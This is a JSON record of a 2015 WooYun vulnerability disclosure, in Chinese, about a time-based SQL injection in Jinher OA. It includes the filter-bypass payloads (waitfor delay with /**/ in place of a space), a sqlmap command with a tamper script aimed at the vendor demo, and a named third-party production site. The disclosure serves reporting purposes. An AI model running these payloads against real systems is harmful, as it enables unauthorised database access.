{"id": 25173, "wybug_id": "wooyun-2015-0132554", "wybug_title": "金和OA最新版再次通杀SQL注入（demo复现）", "wybug_corp": "金和OA", "wybug_author": "黑暗游侠", "wybug_date": "2015-08-10 15:12", "wybug_open_date": "2015-09-24 15:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-09-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 金和OA最新版再次通杀SQL注入（demo复现） 详细说明：  官网：http://www.jinher.com最新版demo：http://demos.jh0101.com/老版本我曾经爆过存在这样一处注入，延时注入\nUploadImageDownLoadIn.aspx?FileID=1\n波及了海量的网站金和官方修复了，加入了过滤我们来看一下\nhttp://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1'waitfor%20delay%20'0:0:3'\n提交后显示：\n\n进行fuzzing逐渐猜解过滤规则，定位关键字\nhttp://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1'\n正常提示，非单引号触发\nhttp://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1'waitfor\n正常提示，非单引号非waitfor触发\nhttp://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1'waitfor%20delay%20\n正常提示，非单引号非waitfor非delay触发\nhttp://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1'waitfor%20delay%20'0:0:5'--\n过滤注入，警告提示找到规则定位点：\ndelay空格'0:0:5'--\n猜想是delay后面匹配了空格，所以触发了过滤尝试构造\n<code>http://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1'waitfor%20delay/**/'0:0:5'--\n</code>成功延时，空格和delay的问题修复非常不完善导致有一次绕过注入最新版本SQLMAP下：\nsqlmap -u \"http://demos.jh0101.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=1\" --dbs --tamper space2comment.py --time-sec 2\n成功得到结果：\n\n对于升级到了最新版jinher的该处注入全部通杀比如中航的oa等等：\nhttp://bjoa.avic-intl.cn/\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-08-12 00:23 |    \t\t张三 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | 张三)\t\t \n  你是我的特别关注！    \n     2015-08-16 10:28 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  怎么这个月不怎么挖洞了，还有@茜茜公主 @紫霞仙子    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}